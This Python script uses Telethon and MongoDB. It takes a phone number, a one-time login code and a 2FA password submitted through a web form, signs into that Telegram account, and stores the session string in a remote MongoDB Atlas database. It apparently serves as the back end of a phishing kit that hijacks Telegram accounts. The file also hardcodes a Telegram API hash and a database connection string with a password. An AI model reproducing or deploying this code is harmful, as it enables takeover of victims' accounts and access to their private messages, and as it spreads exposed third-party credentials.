import os
import sys
import json
import asyncio
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from pymongo import MongoClient
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("telegram_auth.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Telegram API credentials
API_ID = 27573321  # Replace with your actual API ID
API_HASH = "ab789476abc75fb010bda8dbc484a237"  # Replace with your actual API Hash

# MongoDB connection
MONGO_CONNECTION_STRING = "mongodb+srv://djtembaktembak:Qwerty77@@cluster0.omlhu.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
MONGO_DB = "djtembaktembak"
MONGO_TELEGRAM_COLLECTION = "telegram_data"
MONGO_SESSIONS_COLLECTION = "sessions"

class TelegramAuth:
    def __init__(self, phone_number, session_id=None):
        self.phone_number = phone_number
        self.session_id = session_id
        self.mongo_client = MongoClient(MONGO_CONNECTION_STRING)
        self.db = self.mongo_client[MONGO_DB]
        self.telegram_collection = self.db[MONGO_TELEGRAM_COLLECTION]
        self.sessions_collection = self.db[MONGO_SESSIONS_COLLECTION]
        self.client = None
        self.session_string = None
        
        # Try to retrieve existing session
        if session_id:
            existing_session = self.telegram_collection.find_one({
                "session_id": session_id,
                "form_data.phoneNumber": phone_number,
                "telegram_session": {"$exists": True}
            })
            
            if existing_session and "telegram_session" in existing_session:
                self.session_string = existing_session["telegram_session"]
                logger.info(f"Found existing session for {phone_number}")

    async def start_client(self):
        """Initialize the Telegram client"""
        try:
            if self.session_string:
                # Use existing session
                self.client = TelegramClient(StringSession(self.session_string), API_ID, API_HASH)
            else:
                # Create new session
                self.client = TelegramClient(StringSession(), API_ID, API_HASH)
            
            await self.client.connect()
            logger.info("Telegram client started")
            return True
        except Exception as e:
            logger.error(f"Error starting Telegram client: {str(e)}")
            return False

    async def send_code(self):
        """Send login code to the user's phone"""
        try:
            if not await self.client.is_user_authorized():
                await self.client.send_code_request(self.phone_number)
                logger.info(f"Code sent to {self.phone_number}")
                return True
            else:
                logger.info(f"User already authorized")
                return True
        except errors.PhoneNumberInvalidError:
            logger.error(f"Invalid phone number: {self.phone_number}")
            return False
        except Exception as e:
            logger.error(f"Error sending code: {str(e)}")
            return False

    async def sign_in(self, code, password=None):
        """Sign in with the code and optionally password"""
        try:
            try:
                await self.client.sign_in(phone=self.phone_number, code=code)
                # Check if we're signed in (no 2FA needed)
                if await self.client.is_user_authorized():
                    # Save the session
                    await self.save_session()
                    logger.info(f"Successfully signed in without 2FA")
                    return {"success": True, "needs_password": False}
            except errors.SessionPasswordNeededError:
                logger.info(f"2FA password required")
                if password:
                    # If password is provided in the same call
                    await self.client.sign_in(password=password)
                    await self.save_session()
                    logger.info(f"Successfully signed in with 2FA")
                    return {"success": True, "needs_password": False}
                else:
                    # Indicate that we need a password
                    return {"success": True, "needs_password": True}
        except errors.PhoneCodeInvalidError:
            logger.error("Invalid code entered")
            return {"success": False, "error": "Invalid code"}
        except errors.PasswordHashInvalidError:
            logger.error("Invalid 2FA password")
            return {"success": False, "error": "Invalid password"}
        except Exception as e:
            logger.error(f"Sign in error: {str(e)}")
            return {"success": False, "error": str(e)}

    async def sign_in_with_password(self, password):
        """Sign in with just the password (after code verification)"""
        try:
            await self.client.sign_in(password=password)
            await self.save_session()
            logger.info(f"Successfully signed in with 2FA password")
            return {"success": True}
        except errors.PasswordHashInvalidError:
            logger.error("Invalid 2FA password")
            return {"success": False, "error": "Invalid password"}
        except Exception as e:
            logger.error(f"Password sign in error: {str(e)}")
            return {"success": False, "error": str(e)}

    async def save_session(self):
        """Save the session string to MongoDB"""
        if not self.client:
            logger.error("Client not initialized")
            return False
        
        try:
            self.session_string = self.client.session.save()
            
            # Update the MongoDB document with the session string
            result = self.telegram_collection.update_one(
                {"session_id": self.session_id, "form_data.phoneNumber": self.phone_number},
                {"$set": {"telegram_session": self.session_string, "auth_status": "completed"}}
            )
            
            if result.modified_count > 0:
                logger.info(f"Session saved successfully for {self.phone_number}")
                return True
            else:
                # Create a new record if no existing one to update
                self.telegram_collection.insert_one({
                    "session_id": self.session_id,
                    "form_data": {"phoneNumber": self.phone_number},
                    "telegram_session": self.session_string,
                    "auth_status": "completed"
                })
                logger.info(f"New session created for {self.phone_number}")
                return True
        except Exception as e:
            logger.error(f"Error saving session: {str(e)}")
            return False

    async def close(self):
        """Close the Telegram client"""
        if self.client:
            await self.client.disconnect()
            logger.info("Telegram client disconnected")

    async def get_me(self):
        """Get the current user's info (to verify login worked)"""
        if not self.client or not await self.client.is_user_authorized():
            return None
        
        try:
            me = await self.client.get_me()
            return {
                "id": me.id,
                "first_name": me.first_name,
                "last_name": me.last_name,
                "username": me.username,
                "phone": me.phone
            }
        except Exception as e:
            logger.error(f"Error getting user info: {str(e)}")
            return None

# API handler functions
async def process_form(phone_number, session_id):
    """Process the initial form submission and prepare for code entry"""
    auth = TelegramAuth(phone_number, session_id)
    await auth.start_client()
    result = await auth.send_code()
    await auth.close()
    return {"success": result}

async def process_otp(phone_number, code, session_id):
    """Process the OTP verification"""
    auth = TelegramAuth(phone_number, session_id)
    await auth.start_client()
    result = await auth.sign_in(code)
    await auth.close()
    return result

async def process_password(phone_number, password, session_id):
    """Process the 2FA password verification"""
    auth = TelegramAuth(phone_number, session_id)
    await auth.start_client()
    result = await auth.sign_in_with_password(password)
    await auth.close()
    return result

# Main execution functions
def handle_form(phone_number, session_id):
    """Handle form submission"""
    return asyncio.run(process_form(phone_number, session_id))

def handle_otp(phone_number, code, session_id):
    """Handle OTP verification"""
    return asyncio.run(process_otp(phone_number, code, session_id))

def handle_password(phone_number, password, session_id):
    """Handle password verification"""
    return asyncio.run(process_password(phone_number, password, session_id))

# Command line interface for testing
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python telegram_auth.py <command> <phone_number> [code/password] [session_id]")
        sys.exit(1)
    
    command = sys.argv[1]
    phone = sys.argv[2]
    session_id = sys.argv[4] if len(sys.argv) > 4 else "test_session"
    
    if command == "form":
        result = handle_form(phone, session_id)
        print(json.dumps(result))
    elif command == "otp":
        if len(sys.argv) < 4:
            print("Code required for OTP verification")
            sys.exit(1)
        code = sys.argv[3]
        result = handle_otp(phone, code, session_id)
        print(json.dumps(result))
    elif command == "password":
        if len(sys.argv) < 4:
            print("Password required for 2FA verification")
            sys.exit(1)
        password = sys.argv[3]
        result = handle_password(phone, password, session_id)
        print(json.dumps(result))
    else:
        print(f"Unknown command: {command}")
